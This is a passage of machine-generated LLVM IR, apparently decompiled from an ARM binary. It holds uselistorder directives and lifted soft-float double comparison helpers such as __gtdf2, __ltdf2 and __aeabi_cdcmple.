  uselistorder i32 %v0_1aa64, { 0, 2, 1 }
  uselistorder i32 %v1_1aa70, { 1, 0 }
  uselistorder i32 %v3_1aa54, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1aa48, { 1, 2, 0 }
  uselistorder i32 %v3_1aac813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1aac417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1aa48, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1aa54, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1aaf0.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1aa34, { 1, 0 }
  uselistorder i32 %v0_1aa38, { 1, 0 }
  uselistorder i32 %v3_1aa24, { 1, 0 }
  uselistorder i1 %v1_1aa18, { 1, 0 }
  uselistorder i32 %v3_1aa08, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1aa04, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1a9fc, { 2, 1, 0 }
  uselistorder i32 %v5_1a9f8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1a9d8, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1a9c8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1a9c8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1a9c4, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1a9c4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1a9b8, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 7, 8, 3, 4, 5, 6, 9, 1 }
  uselistorder i32* %ip.global-to-local, { 9, 7, 8, 6, 0, 1, 2, 3, 4, 5, 10 }
  uselistorder i32 (i32, i32)* @function_1a9a8, { 2, 1, 0 }
  uselistorder i32 ()* @function_1a814, { 1, 0 }
  uselistorder i32 1024, { 2, 0, 11, 12, 3, 13, 1, 14, 15, 16, 5, 9, 10, 4, 8, 7, 6, 17 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 11, 26, 12, 13, 2, 14, 15, 30, 131, 132, 139, 141, 16, 142, 17, 145, 146, 43, 147, 149, 166, 167, 168, 32, 31, 44, 169, 18, 170, 171, 154, 155, 109, 110, 45, 94, 95, 96, 97, 143, 144, 90, 91, 92, 93, 140, 3, 46, 172, 173, 174, 175, 37, 38, 39, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 156, 160, 161, 133, 47, 134, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 157, 40, 122, 135, 136, 48, 49, 137, 138, 98, 99, 50, 100, 51, 52, 53, 33, 148, 41, 101, 178, 102, 54, 55, 56, 57, 58, 60, 61, 150, 151, 152, 153, 62, 180, 181, 0, 182, 183, 59, 63, 164, 28, 162, 163, 5, 4, 34, 64, 65, 66, 67, 68, 69, 123, 124, 125, 126, 127, 128, 85, 158, 159, 103, 70, 71, 165, 19, 72, 73, 20, 27, 21, 22, 6, 23, 24, 35, 74, 75, 104, 105, 106, 107, 76, 108, 77, 42, 86, 78, 129, 79, 87, 88, 80, 89, 130, 29, 36, 81, 176, 177, 82, 179, 25, 83, 84 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 64, 65, 33, 6, 7, 22, 8, 133, 134, 141, 143, 144, 145, 146, 9, 147, 149, 150, 151, 152, 153, 34, 75, 50, 51, 66, 162, 163, 164, 165, 29, 98, 76, 77, 78, 79, 148, 142, 180, 181, 186, 235, 42, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 166, 99, 100, 101, 102, 103, 104, 105, 106, 107, 10, 43, 108, 40, 109, 110, 67, 111, 112, 167, 168, 169, 135, 136, 137, 138, 139, 140, 80, 81, 82, 83, 52, 253, 254, 35, 84, 11, 131, 183, 85, 86, 31, 187, 188, 189, 190, 191, 192, 193, 194, 12, 56, 195, 196, 197, 198, 199, 200, 201, 202, 13, 154, 155, 156, 157, 158, 159, 160, 161, 203, 204, 205, 206, 14, 207, 208, 15, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 226, 219, 220, 221, 222, 57, 24, 223, 224, 225, 58, 59, 16, 227, 228, 229, 230, 232, 233, 60, 17, 234, 18, 231, 175, 46, 47, 44, 45, 25, 26, 37, 38, 48, 255, 174, 170, 171, 113, 114, 68, 115, 116, 117, 118, 30, 119, 61, 62, 120, 121, 122, 49, 123, 124, 125, 126, 27, 28, 127, 128, 129, 63, 172, 173, 87, 176, 32, 177, 178, 179, 53, 69, 36, 19, 20, 23, 21, 88, 89, 90, 54, 91, 92, 93, 94, 55, 95, 96, 97, 70, 130, 71, 72, 73, 74, 41, 39, 132, 182, 184, 185 }
  uselistorder i32 4, { 5, 6, 187, 262, 263, 188, 7, 8, 267, 268, 269, 270, 271, 69, 272, 273, 281, 283, 284, 101, 285, 286, 287, 81, 288, 291, 126, 292, 293, 294, 295, 296, 297, 9, 298, 127, 102, 299, 128, 0, 1, 129, 302, 324, 325, 104, 103, 326, 130, 131, 132, 133, 327, 328, 106, 329, 105, 330, 83, 225, 226, 227, 315, 316, 201, 202, 289, 290, 196, 197, 198, 199, 200, 282, 10, 331, 11, 332, 339, 274, 12, 13, 14, 221, 15, 16, 228, 17, 100, 95, 96, 18, 398, 97, 399, 86, 19, 20, 98, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 21, 417, 418, 419, 420, 421, 422, 85, 423, 424, 425, 426, 427, 428, 22, 23, 99, 429, 318, 107, 229, 230, 231, 232, 233, 234, 235, 236, 237, 82, 238, 239, 240, 241, 242, 317, 243, 134, 275, 276, 277, 278, 279, 280, 24, 203, 204, 205, 206, 25, 207, 430, 135, 108, 136, 431, 26, 432, 137, 195, 342, 343, 344, 90, 345, 138, 27, 208, 139, 209, 140, 87, 210, 264, 141, 265, 266, 334, 335, 336, 337, 142, 143, 211, 144, 145, 212, 28, 213, 214, 84, 88, 348, 349, 350, 351, 352, 353, 146, 147, 29, 354, 355, 356, 357, 358, 359, 360, 361, 148, 346, 347, 303, 304, 305, 306, 307, 308, 309, 310, 311, 30, 312, 313, 314, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 149, 150, 151, 376, 377, 380, 383, 378, 379, 109, 152, 381, 70, 382, 384, 385, 386, 388, 153, 32, 31, 387, 154, 155, 156, 340, 319, 397, 33, 34, 35, 36, 2, 244, 37, 38, 157, 71, 39, 40, 215, 158, 41, 159, 160, 161, 162, 245, 246, 42, 247, 163, 248, 249, 250, 111, 251, 252, 110, 164, 253, 254, 255, 256, 257, 258, 72, 165, 259, 261, 166, 167, 260, 189, 320, 43, 321, 112, 322, 323, 300, 301, 389, 390, 190, 44, 45, 46, 47, 73, 48, 49, 50, 74, 51, 52, 168, 53, 216, 113, 217, 218, 219, 220, 222, 91, 223, 92, 224, 54, 93, 94, 55, 191, 169, 75, 115, 192, 170, 171, 172, 173, 119, 174, 175, 117, 114, 193, 118, 56, 176, 116, 57, 194, 125, 58, 59, 89, 177, 120, 333, 178, 76, 77, 60, 61, 62, 122, 121, 123, 78, 179, 124, 63, 64, 79, 180, 338, 181, 80, 182, 183, 65, 341, 66, 67, 68, 391, 392, 393, 394, 395, 396, 184, 185, 186, 3, 4 }
  uselistorder i32 32, { 95, 96, 97, 98, 30, 31, 39, 82, 83, 33, 34, 99, 32, 40, 100, 101, 102, 103, 37, 104, 117, 119, 120, 131, 47, 84, 132, 121, 122, 85, 86, 87, 88, 118, 133, 41, 35, 105, 48, 22, 106, 107, 49, 123, 124, 43, 42, 51, 55, 52, 56, 53, 57, 54, 58, 59, 125, 126, 60, 68, 69, 67, 70, 71, 72, 73, 74, 75, 62, 63, 1, 64, 2, 65, 4, 3, 61, 66, 50, 76, 134, 6, 5, 8, 7, 10, 9, 36, 129, 127, 128, 108, 109, 21, 110, 0, 77, 111, 112, 113, 114, 115, 116, 23, 89, 90, 130, 135, 78, 91, 79, 38, 92, 93, 94, 12, 11, 24, 44, 80, 25, 14, 13, 16, 15, 26, 18, 17, 27, 28, 20, 19, 29, 45, 46, 81 }
  uselistorder i32 33, { 4, 5, 6, 3, 7, 8, 9, 0, 2, 1 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 85, 13, 14, 15, 84, 96, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 89, 56, 90, 57, 91, 58, 92, 93, 59, 60, 62, 61, 63, 64, 65, 66, 0, 87, 1, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 83, 94, 77, 82, 88, 95, 81, 78, 86, 79, 80 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 75, 76, 77, 78, 126, 127, 4, 128, 129, 130, 131, 147, 148, 149, 150, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 189, 190, 191, 192, 193, 194, 195, 207, 208, 209, 221, 222, 223, 224, 6, 5, 33, 34, 35, 36, 37, 38, 225, 226, 7, 227, 228, 229, 230, 231, 232, 233, 151, 152, 153, 154, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 132, 8, 133, 134, 79, 80, 81, 82, 9, 83, 84, 85, 86, 87, 88, 89, 135, 136, 137, 138, 10, 11, 139, 140, 141, 142, 143, 144, 145, 146, 39, 40, 41, 42, 43, 44, 45, 46, 12, 13, 14, 290, 291, 292, 293, 294, 295, 2, 296, 297, 28, 15, 29, 16, 30, 288, 289, 47, 48, 49, 122, 123, 124, 125, 50, 51, 52, 53, 54, 55, 25, 256, 260, 261, 262, 263, 257, 258, 259, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 264, 265, 266, 267, 268, 17, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 284, 286, 280, 281, 282, 283, 285, 287, 58, 59, 3, 60, 26, 251, 252, 253, 254, 255, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 18, 210, 211, 61, 19, 62, 63, 212, 20, 213, 214, 101, 21, 24, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 1, 117, 22, 31, 102, 0, 103, 104, 56, 57, 215, 216, 23, 217, 218, 219, 220, 118, 119, 120, 121, 180, 181, 182, 183, 184, 185, 186, 187, 188, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 27, 248, 249, 250, 32 }
  uselistorder i32* @r5, { 126, 127, 128, 129, 130, 131, 132, 133, 134, 54, 55, 56, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 246, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 1, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 8, 287, 288, 289, 290, 291, 344, 299, 300, 301, 302, 303, 304, 305, 28, 306, 307, 308, 325, 361, 362, 9, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 10, 378, 377, 30, 379, 380, 381, 382, 383, 57, 58, 59, 60, 61, 62, 63, 384, 385, 386, 387, 388, 389, 394, 395, 390, 391, 392, 393, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 11, 157, 158, 64, 65, 66, 67, 68, 69, 70, 71, 72, 247, 248, 249, 250, 251, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 345, 346, 347, 348, 450, 451, 452, 224, 33, 225, 5, 226, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 326, 327, 31, 328, 227, 228, 229, 230, 159, 2, 160, 161, 162, 163, 164, 165, 231, 14, 232, 233, 12, 234, 235, 236, 237, 238, 239, 13, 240, 241, 242, 243, 244, 245, 73, 15, 74, 75, 76, 77, 34, 78, 16, 79, 80, 81, 82, 83, 465, 17, 466, 467, 477, 43, 44, 45, 46, 47, 48, 49, 468, 469, 470, 471, 472, 84, 85, 86, 87, 88, 89, 90, 91, 92, 210, 211, 212, 93, 94, 95, 96, 18, 19, 473, 474, 475, 476, 97, 98, 99, 100, 418, 419, 423, 424, 425, 426, 427, 420, 421, 422, 309, 310, 311, 20, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 7, 441, 442, 443, 444, 445, 21, 446, 447, 448, 449, 105, 106, 107, 108, 109, 408, 409, 410, 411, 415, 416, 22, 417, 349, 23, 350, 351, 352, 166, 24, 167, 35, 168, 169, 170, 171, 172, 173, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 110, 111, 112, 113, 114, 339, 340, 341, 342, 343, 174, 175, 177, 176, 178, 179, 25, 180, 181, 182, 183, 184, 185, 186, 32, 187, 188, 192, 6, 193, 3, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 50, 51, 52, 189, 190, 191, 102, 101, 29, 103, 104, 353, 354, 355, 356, 357, 358, 26, 359, 360, 204, 205, 206, 207, 208, 209, 292, 293, 294, 295, 296, 27, 297, 298, 115, 116, 4, 0, 117, 118, 119, 120, 121, 122, 123, 124, 125, 36, 37, 38, 39, 40, 41, 42, 412, 413, 414, 53 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1aba4, { 1, 0 }
  uselistorder label %dec_label_pc_1ab88, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1ab54, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1aa44, { 1, 0 }
  uselistorder label %dec_label_pc_1aa2c, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1abc8 = call i32 @function_1abd8()
  ret i32 %v0_1abc8
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1abd0 = call i32 @function_1abd8()
  ret i32 %v0_1abd0

; uselistorder directives
  uselistorder i32 ()* @function_1abd8, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1abd4 = load i32, i32* @r0, align 4
  ret i32 %v0_1abd4
}

define i32 @function_1abd8() local_unnamed_addr {
dec_label_pc_1abd8:
  %v0_1abd8 = load i32, i32* @ip, align 4
  %v0_1abdc = load i32, i32* @r1, align 4
  %v2_1abdc = mul i32 %v0_1abdc, 2
  %v2_1abdc.off = add i32 %v2_1abdc, 4194303
  %tmp = icmp ult i32 %v2_1abdc.off, 2097152
  %v0_1abe4 = load i32, i32* @r3, align 4
  %v2_1abe4 = mul i32 %v0_1abe4, 2
  br i1 %tmp, label %dec_label_pc_1ac34, label %bb

bb:                                               ; preds = %dec_label_pc_1abd8
  %v2_1abe4.off = add i32 %v2_1abe4, 4194303
  %tmp21 = icmp ult i32 %v2_1abe4.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1ac28, label %dec_label_pc_1abf0

dec_label_pc_1abf0:                               ; preds = %dec_label_pc_1ac3c, %dec_label_pc_1ac48, %bb
  %v0_1abf0 = load i32, i32* @r0, align 4
  %v4_1abf0 = or i32 %v0_1abf0, %v2_1abdc
  %v6_1abf0 = icmp eq i32 %v4_1abf0, 0
  br i1 %v6_1abf0, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1abf0
  %v1_1abf4 = load i32, i32* @r2, align 4
  %v5_1abf4 = or i32 %v1_1abf4, %v2_1abe4
  %v7_1abf4 = icmp eq i32 %v5_1abf4, 0
  br i1 %v7_1abf4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1abf0, %bb10
  %v5_1abf8 = icmp eq i32 %v0_1abe4, %v0_1abdc
  br i1 %v5_1abf8, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1abfc.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1abfc = phi i32 [ %v2_1abfc.pre, %.thread..thread1_crit_edge ], [ %v1_1abf4, %bb10 ]
  %v5_1abfc = icmp eq i32 %v2_1abfc, %v0_1abf0
  br i1 %v5_1abfc, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1ac04 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1ac04 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1ac04, i32 %v0_1ac04)
  %v0_1ac08 = load i32, i32* @r0, align 4
  %v0_1ac0c = load i32, i32* @r1, align 4
  %v1_1ac0c = load i32, i32* @r3, align 4
  %v2_1ac0c = xor i32 %v1_1ac0c, %v0_1ac0c
  %v3_1ac0c = icmp slt i32 %v2_1ac0c, 0
  br i1 %v3_1ac0c, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1ac10 = icmp eq i32 %v0_1ac0c, %v1_1ac0c
  br i1 %v10_1ac10, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1ac14 = load i32, i32* @r2, align 4
  %v4_1ac14 = icmp ult i32 %v0_1ac08, %v2_1ac14
  br i1 %v4_1ac14, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1ac10 = icmp ult i32 %v0_1ac0c, %v1_1ac0c
  br i1 %v4_1ac10, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1ac0c, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1ac18 = and i32 %v1_1ac0c, 1073741824
  %v3_1ac18 = icmp eq i32 %v2_1ac18, 0
  %v4_1ac18 = ashr i32 %v1_1ac0c, 31
  br i1 %v3_1ac18, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1ac1c.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1ac18, %bb15 ]
  %v5_1ac1c = sub nsw i32 -1, %v4_1ac1c.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1ac20 = phi i32 [ %v4_1ac18, %bb15 ], [ %v5_1ac1c, %.thread3 ]
  %v1_1ac20 = or i32 %v0_1ac20, 1
  ret i32 %v1_1ac20

dec_label_pc_1ac28:                               ; preds = %bb
  br label %dec_label_pc_1ac3c

dec_label_pc_1ac34:                               ; preds = %dec_label_pc_1abd8
  %v0_1ac34 = load i32, i32* @r0, align 4
  %v4_1ac34 = mul i32 %v0_1abdc, 4096
  %v5_1ac34 = or i32 %v0_1ac34, %v4_1ac34
  %v7_1ac34 = icmp eq i32 %v5_1ac34, 0
  br i1 %v7_1ac34, label %dec_label_pc_1ac34.dec_label_pc_1ac3c_crit_edge, label %dec_label_pc_1ac50

dec_label_pc_1ac34.dec_label_pc_1ac3c_crit_edge:  ; preds = %dec_label_pc_1ac34
  %v2_1abe4.off20 = add i32 %v2_1abe4, 4194303
  %tmp22 = icmp ult i32 %v2_1abe4.off20, 2097152
  br label %dec_label_pc_1ac3c

dec_label_pc_1ac3c:                               ; preds = %dec_label_pc_1ac34.dec_label_pc_1ac3c_crit_edge, %dec_label_pc_1ac28
  %v3_1ac40.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1ac34.dec_label_pc_1ac3c_crit_edge ], [ true, %dec_label_pc_1ac28 ]
  br i1 %v3_1ac40.pre-phi, label %dec_label_pc_1ac48, label %dec_label_pc_1abf0

dec_label_pc_1ac48:                               ; preds = %dec_label_pc_1ac3c
  %v0_1ac48 = load i32, i32* @r2, align 4
  %v4_1ac48 = mul i32 %v0_1abe4, 4096
  %v5_1ac48 = or i32 %v0_1ac48, %v4_1ac48
  %v7_1ac48 = icmp eq i32 %v5_1ac48, 0
  br i1 %v7_1ac48, label %dec_label_pc_1abf0, label %dec_label_pc_1ac50

dec_label_pc_1ac50:                               ; preds = %dec_label_pc_1ac34, %dec_label_pc_1ac48
  ret i32 %v0_1abd8

; uselistorder directives
  uselistorder i32 %v4_1ac18, { 1, 0 }
  uselistorder i32 %v1_1ac0c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1ac0c, { 2, 1, 0 }
  uselistorder i32 %v1_1abf4, { 1, 0 }
  uselistorder i32 %v2_1abe4, { 0, 2, 1 }
  uselistorder i32 %v0_1abe4, { 1, 0, 2 }
  uselistorder i32 %v2_1abdc, { 1, 0 }
  uselistorder i32 %v0_1abdc, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 10, 4, 2, 5, 6, 11, 3, 18, 12, 7, 8, 1, 13, 0, 14, 15, 16, 17, 9 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 6, 4, 5, 7, 8, 9, 10, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 47, 48, 49, 57, 58, 59, 41, 11, 17, 64, 55, 42, 44, 69, 74, 72, 73, 71, 65, 66, 13, 14, 67, 68, 70, 61, 62, 53, 15, 56, 16, 43, 0, 54, 12, 50, 51, 52, 60, 63, 1, 2, 3 }
  uselistorder i32* @r3, { 25, 26, 16, 17, 27, 28, 7, 29, 30, 31, 32, 49, 50, 51, 52, 53, 54, 55, 56, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 2, 81, 6, 18, 20, 21, 83, 84, 103, 104, 3, 105, 106, 107, 4, 108, 109, 110, 5, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 0, 129, 130, 131, 132, 33, 34, 92, 93, 94, 35, 36, 37, 38, 39, 40, 19, 133, 139, 140, 141, 137, 57, 58, 59, 96, 97, 95, 60, 41, 42, 98, 99, 100, 101, 102, 9, 10, 11, 145, 142, 143, 144, 1, 146, 147, 148, 43, 44, 64, 22, 65, 66, 67, 68, 45, 46, 69, 138, 61, 62, 63, 134, 135, 136, 23, 24, 47, 48, 12, 13, 14, 15, 85, 86, 87, 88, 89, 90, 91, 8 }
  uselistorder i32* @r1, { 65, 66, 12, 67, 68, 69, 70, 71, 13, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 29, 30, 14, 31, 32, 83, 1, 84, 85, 86, 87, 88, 89, 90, 11, 91, 92, 93, 94, 119, 15, 120, 121, 122, 125, 16, 18, 126, 127, 128, 129, 130, 131, 134, 135, 136, 137, 138, 141, 149, 150, 151, 152, 155, 156, 157, 8, 33, 34, 158, 159, 142, 95, 35, 37, 160, 161, 167, 168, 123, 58, 143, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 19, 124, 0, 36, 38, 20, 28, 132, 133, 2, 139, 140, 3, 4, 178, 39, 21, 169, 170, 27, 177, 5, 174, 175, 176, 144, 145, 146, 107, 108, 109, 22, 23, 162, 163, 164, 165, 166, 6, 153, 154, 9, 173, 24, 17, 7, 110, 111, 112, 10, 113, 114, 115, 25, 147, 148, 116, 117, 179, 180, 26, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 61, 62, 63, 64, 118, 171, 172, 181 }
  uselistorder i32* @ip, { 25, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 67, 68, 69, 70, 71, 77, 78, 80, 81, 82, 83, 84, 85, 86, 87, 95, 1, 103, 102, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 123, 121, 124, 10, 125, 11, 126, 127, 128, 129, 33, 34, 2, 35, 20, 79, 130, 131, 132, 146, 151, 152, 74, 75, 14, 37, 36, 6, 38, 39, 7, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 12, 191, 192, 193, 194, 195, 196, 197, 198, 199, 76, 40, 41, 42, 43, 44, 200, 88, 89, 3, 90, 91, 92, 93, 94, 154, 13, 96, 97, 98, 99, 100, 101, 155, 156, 147, 15, 107, 108, 45, 72, 73, 157, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 47, 46, 8, 204, 201, 202, 203, 9, 205, 104, 0, 22, 105, 4, 106, 23, 5, 24, 49, 50, 51, 52, 53, 54, 55, 56, 48, 57, 58, 59, 60, 61, 62, 63, 64, 21, 109, 110, 111, 65, 66, 148, 149, 150, 153, 16 }
  uselistorder label %dec_label_pc_1ac50, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1abf0, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1ac58 = load i32, i32* @r0, align 4
  %v0_1ac5c = load i32, i32* @r2, align 4
  store i32 %v0_1ac5c, i32* @r0, align 4
  store i32 %v0_1ac58, i32* @r2, align 4
  %v0_1ac70 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1ac70
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1ac74 = load i32, i32* @r0, align 4
  %v1_1ac78 = sext i32 %v3_1ac74 to i64
  %v2_1ac78 = bitcast i64 %v1_1ac78 to double
  %v3_1ac78 = load i32, i32* @r2, align 4
  %v4_1ac78 = sext i32 %v3_1ac78 to i64
  %v5_1ac78 = bitcast i64 %v4_1ac78 to double
  %v7_1ac78 = fcmp oeq double %v2_1ac78, %v5_1ac78
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1ac78 = fcmp ule double %v2_1ac78, %v5_1ac78
  %not.v7_1ac78 = xor i1 %v7_1ac78, true
  %v1_1ac7c = and i1 %not.v6_1ac78, %not.v7_1ac78
  store i1 %v7_1ac78, i1* @cpsr_z, align 1
  br i1 %v1_1ac7c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1ac78, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1ac74

; uselistorder directives
  uselistorder i1 %v7_1ac78, { 1, 2, 0 }
